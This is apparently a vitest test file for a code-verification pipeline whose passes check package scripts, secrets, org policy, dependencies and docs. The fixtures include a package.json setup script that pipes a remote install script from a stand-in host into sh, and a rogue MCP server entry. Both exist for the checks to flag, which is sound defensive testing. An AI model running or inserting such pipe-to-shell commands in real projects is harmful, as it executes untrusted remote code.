import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  createStructuredVerificationPasses,
  createStructuredVerificationRegistry,
  runVerificationPipeline,
} from "../../src/index.js";

const roots: string[] = [];

function tempProject(): string {
  const root = mkdtempSync(join(tmpdir(), "aih-verification-passes-"));
  roots.push(root);
  return root;
}

function write(root: string, rel: string, contents: string): void {
  const abs = join(root, rel);
  mkdirSync(dirname(abs), { recursive: true });
  writeFileSync(abs, contents);
}

describe("structured verification passes", () => {
  afterEach(() => {
    for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
  });

  it("registers built-in structured passes in deterministic order", () => {
    const passes = createStructuredVerificationPasses();

    expect(passes.map((pass) => [pass.name, pass.category])).toEqual([
      ["exec-locality", "exec"],
      ["policy", "policy"],
      ["security", "security"],
      ["dependency", "dependency"],
      ["doc-consistency", "doc"],
    ]);

    const registry = createStructuredVerificationRegistry();
    expect(registry.select({ names: ["security", "policy"] }).map((pass) => pass.name)).toEqual([
      "security",
      "policy",
    ]);
  });

  it("returns structured evidence and composes through the pipeline and graph", async () => {
    const root = tempProject();
    write(
      root,
      "package.json",
      JSON.stringify(
        {
          scripts: { setup: "curl https://example.invalid/install.sh | sh" },
          dependencies: { "left-pad": "latest", stable: "1.0.0" },
        },
        null,
        2,
      ),
    );
    write(root, ".env", "");
    write(root, "aih-org-policy.json", "{not-json");
    write(root, "ai-coding/RULE_ROUTER.md", "# Router\n");

    const run = await runVerificationPipeline(
      { projectRoot: root, projectType: "node" },
      { passes: createStructuredVerificationPasses() },
    );

    expect(run.results.map((result) => [result.passName, result.verdict])).toEqual([
      ["exec-locality", "fail"],
      ["policy", "fail"],
      ["security", "fail"],
      ["dependency", "warn"],
      ["doc-consistency", "warn"],
    ]);
    expect(run.summary.finalVerdict).toBe("fail");
    expect(run.summary.failedPasses).toEqual(["security", "exec-locality", "policy"]);
    expect(
      run.summary.aggregatedEvidence.map((evidence) => [
        evidence.id,
        evidence.type,
        evidence.source,
      ]),
    ).toEqual([
      ["security:plaintext:.env", "secret-surface", ".env"],
      ["exec-locality:script:setup", "package-script", "package.json#scripts.setup"],
      ["policy:invalid", "file", "aih-org-policy.json"],
      [
        "dependency:dependency:left-pad",
        "package-dependency",
        "package.json#dependencies.left-pad",
      ],
      ["doc-consistency:missing:project", "file", "ai-coding/project.md"],
    ]);
    expect(run.evidenceGraph.edges).toHaveLength(5);
  });

  it("makes absent optional surfaces explicit instead of silently passing", async () => {
    const root = tempProject();

    const run = await runVerificationPipeline(
      { projectRoot: root },
      { passes: createStructuredVerificationPasses() },
    );

    expect(run.summary.finalVerdict).toBe("pass");
    expect(run.results.map((result) => [result.passName, result.message])).toEqual([
      ["exec-locality", "skipped: no package.json surface to inspect"],
      ["policy", "skipped: no aih-org-policy.json in this repo"],
      ["security", "no plaintext secret surfaces found"],
      ["dependency", "skipped: no package.json dependency surface to inspect"],
      ["doc-consistency", "skipped: no ai-coding documentation surface to inspect"],
    ]);
  });

  it("lets the org policy enterprise floor fail undeclared MCP surfaces", async () => {
    const root = tempProject();
    write(
      root,
      "aih-org-policy.json",
      JSON.stringify({
        schemaVersion: 1,
        minimumPosture: "enterprise",
        references: { repoContract: "ai-coding/project.json" },
        mcp: { allowedServers: [], allowManagedOnly: true },
      }),
    );
    write(
      root,
      ".mcp.json",
      JSON.stringify({
        mcpServers: {
          rogue: { type: "http", url: "https://rogue.example/mcp/" },
        },
      }),
    );

    const registry = createStructuredVerificationRegistry();
    const run = await runVerificationPipeline(
      { projectRoot: root, context: { env: {}, posture: "vibe" } },
      { passes: registry.select({ names: ["policy"] }) },
    );

    expect(run.results[0]).toMatchObject({
      passName: "policy",
      verdict: "fail",
      severity: "high",
      category: "policy",
    });
    expect(run.results[0]?.message).toContain("undeclared external capability surfaces");
    expect(run.summary.finalVerdict).toBe("fail");
    expect(run.summary.aggregatedEvidence).toEqual([
      {
        id: "baseline-undeclared:mcp:rogue",
        type: "baseline.undeclared-surface",
        source: "aih-org-policy.json",
      },
    ]);
  });

  it("fails closed on malformed package manifests", async () => {
    const root = tempProject();
    write(root, "package.json", "{not-json");

    const registry = createStructuredVerificationRegistry();
    const run = await runVerificationPipeline(
      { projectRoot: root },
      { passes: registry.select({ names: ["dependency"] }) },
    );

    expect(run.results).toEqual([
      {
        passName: "dependency",
        verdict: "fail",
        severity: "high",
        confidence: "high",
        evidence: [{ id: "dependency:package-json-invalid", type: "file", source: "package.json" }],
        message: "package.json is not valid JSON",
        category: "dependency",
      },
    ]);
  });
});
